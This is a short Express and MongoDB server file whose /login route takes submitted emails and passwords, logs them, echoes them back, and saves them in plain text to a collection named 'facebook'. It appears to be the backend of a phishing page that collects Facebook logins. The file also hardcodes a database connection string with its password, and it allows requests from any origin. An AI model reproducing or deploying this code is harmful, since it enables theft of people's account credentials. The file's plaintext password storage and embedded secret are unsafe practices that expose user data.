const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors"); // Import the cors package

require("dotenv").config(); // Load environment variables from .env

const app = express();

// Use environment variables or provide default values
const port = process.env.PORT || 5000;
const host = process.env.HOST || "localhost";

// Middleware to parse JSON bodies
app.use(express.json());

// Enable CORS for all routes
app.use(cors());


// Manually set Access-Control-Allow-Origin for all responses
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

mongoose
  .connect(
    "mongodb+srv://next-course:Ff123456789@cluster0.hozny.mongodb.net/playground?retryWrites=true&w=majority&appName=Cluster0",
    {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    }
  )
  .then(() => console.log("Connected to MondoDB..."))
  .catch((err) => console.error("Could not connect to Mongodb..."));

const facebookSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    minlength: 5,
    maxlength: 255,
  },
  password: {
    type: String,
    required: true,
    minlength: 5,
    maxlength: 255,
  },
});

const Facebook = mongoose.model("facebook", facebookSchema);

async function createCredential(email, pass) {
  const facebook = new Facebook({
    email: email,
    password: pass,
  });
  try {
    const result = await facebook.save();
    console.log(result);
  } catch (ex) {
    for (field in ex.errors) {
      console.log(ex.errors[field].message);
    }
  }
}

// Sample route
app.get("/", (req, res) => {
  res.send("Hello, Worldasdfsdf!");
});

// Route to handle POST request
app.post("/login", (req, res) => {
  const { email, password } = req.body;
  console.log(email, password);

  createCredential(email, password);
  // Simple response with the extracted data
  res.json({
    message: "Received the data!",
    email: email,
    password: password,
  });
});

// Start the server
app.listen(port, host, () => {
  console.log(`Server running at http://localhost:${port}`);
});
